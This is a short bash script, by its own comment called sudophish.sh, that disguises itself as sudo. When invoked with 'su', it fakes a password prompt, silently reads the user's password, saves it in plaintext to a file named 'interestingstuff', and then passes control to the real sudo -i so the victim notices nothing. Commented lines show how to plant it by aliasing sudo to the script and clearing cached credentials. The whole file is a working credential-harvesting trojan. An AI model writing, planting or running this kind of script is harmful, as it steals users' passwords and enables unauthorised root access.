#! /bin/bash
if [ $(echo $1|tr '[:lower:]' '[:upper:]') != 'SU' ]  
then
        sudo "$@"
	exit
fi
echo -n "Password:";read -s password; echo $password > interestingstuff; echo; 
sudo -i
# sudo -k
# alias sudo=`pwd`/sudophish.sh

